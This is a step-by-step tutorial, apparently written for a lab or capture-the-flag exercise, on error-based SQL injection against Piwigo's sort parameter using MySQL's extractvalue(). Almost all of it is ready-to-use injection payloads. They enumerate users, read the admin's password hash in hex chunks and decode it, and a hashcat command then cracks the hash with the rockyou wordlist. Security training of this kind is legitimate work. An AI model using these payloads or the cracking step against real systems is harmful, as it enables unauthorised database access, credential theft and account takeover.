Extracting Password Hashes via Error-Based SQL Injection

MySQL · extractvalue() · Piwigo · phpass hashes · hex extraction method

0 Overview & Key Facts

The core technique: MySQL's extractvalue() function throws an XPath error that leaks the value we inject into the error message. The output is limited to 32 characters — so long values must be extracted in chunks. Use hex encoding to avoid ambiguity with special characters.

1 Confirm the Injection Point

1
Test ORDER BY parameter with a basic extractvalue payload
inject into order/sort parameter
asc, extractvalue('',concat('>',version()))

If you see a MySQL XPATH syntax error with a version number → injection confirmed.

2 Identify the Admin User

1
Get all usernames and IDs
MySQL
asc, extractvalue('',concat('>',(select concat(id,':',username) from piwigo_users limit 1 offset 0)))

Change offset 0 → offset 1 → offset 2 to iterate through users. Find which ID belongs to admin.

2
Verify admin user ID
MySQL
asc, extractvalue('',concat('>',(select concat(id,':',username) from piwigo_users where username="admin")))

Error will show something like >1:admin — admin is ID 1.

3 Check Hash Length

1
Get exact character count of the password hash
MySQL
asc, extractvalue('',concat('>',(select length(password) from piwigo_users where id=1)))

Error shows >34 → hash is 34 characters. Since extractvalue only shows 32 chars, we need multiple chunks.

4 Extract Hash Using Hex Encoding

⚠ Do NOT use substring directly — special characters in the hash (like $, /) can be confused with XPath syntax in the error output. Always use hex encoding for accurate extraction.
1
Get chars 1-17 as hex (first chunk)
MySQL — chunk 1
asc, extractvalue('',concat('!!',(select hex(substring(password,1,17)) from piwigo_users where id=1)))

Use !! as delimiter — unambiguous and not part of hex output. Each character = 2 hex digits, so 17 chars = 34 hex digits (fits in 32-char limit).

2
Get chars 18-34 as hex (second chunk)
MySQL — chunk 2
asc, extractvalue('',concat('!!',(select hex(substring(password,18,17)) from piwigo_users where id=1)))

Gets the remaining 17 characters of the 34-char hash.

3
If output is cut off — get missing middle chars
MySQL — fill gaps
asc, extractvalue('',concat('!!',(select hex(substring(password,X,2)) from piwigo_users where id=1)))

Replace X with the start position of any missing chars.

5 Decode Hex to Characters

Each pair of hex digits = one character. Common ones to know:

Quick decode: Use Python: bytes.fromhex('2450244768786D...').decode()
Or online: rapidtables.com hex to ASCII

6 Build the Complete Hash

Chunk 1hex(substring(password,1,17)) → chars 1-17
Chunk 2hex(substring(password,18,17)) → chars 18-34
CombinedConcatenate decoded chunks in order
Example result: $P$Ghxmchgk.0YxEQutC7os3dZfBvqGIz/
⚠ Common mistakes:
• Including the > or !! delimiter in your answer — these are NOT part of the hash
• Missing the trailing / — phpass hashes can end with / and it IS part of the hash
• Confusing XPath error syntax characters with hash characters — use hex to avoid this
• Submitting only 32 chars — always check length(password) first

Crack the hash with hashcat

bash
hashcat -m 400 '$P$Ghxmchgk.0YxEQutC7os3dZfBvqGIz/' /usr/share/wordlists/rockyou.txt
Hash type reference:
$P$ = phpass (hashcat mode 400)
$2y$ = bcrypt (hashcat mode 3200)
32 hex chars = plain MD5 (hashcat mode 0)
$1$ = MD5crypt (hashcat mode 500)
